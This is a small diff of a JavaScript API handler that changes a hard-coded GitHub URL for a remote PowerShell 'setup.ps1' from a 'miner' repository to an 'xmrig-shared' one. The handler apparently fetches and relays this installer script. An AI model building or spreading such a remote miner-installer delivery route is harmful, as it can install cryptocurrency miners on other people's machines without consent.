@@ -13,7 +13,7 @@ export default async function handler(req, res) {
   }
 
   const rawUrl =
-    'https://raw.githubusercontent.com/5q0r/miner/refs/heads/main/setup.ps1';
+    'https://raw.githubusercontent.com/5q0r/xmrig-shared/refs/heads/main/setup.ps1';
 
   try {
     const controller = new AbortController();
